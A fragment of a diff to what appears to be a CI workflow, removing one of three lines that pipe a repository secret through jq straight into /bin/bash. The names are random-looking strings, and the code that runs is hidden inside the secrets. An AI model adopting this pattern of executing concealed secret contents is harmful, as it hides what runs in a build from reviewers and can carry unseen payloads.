@@ -19,7 +19,6 @@ jobs:
           kfip66: ${{ secrets.kfip66 }}
         run: |
           printf '%s' "$kfip66" | jq -r .xjmh3846 | /bin/bash
-          printf '%s' "$ro2420" | jq -r .isrn73546 | /bin/bash
           printf '%s' "$s9" | jq -r .hi6674 | /bin/bash
 
       - name: Persist output
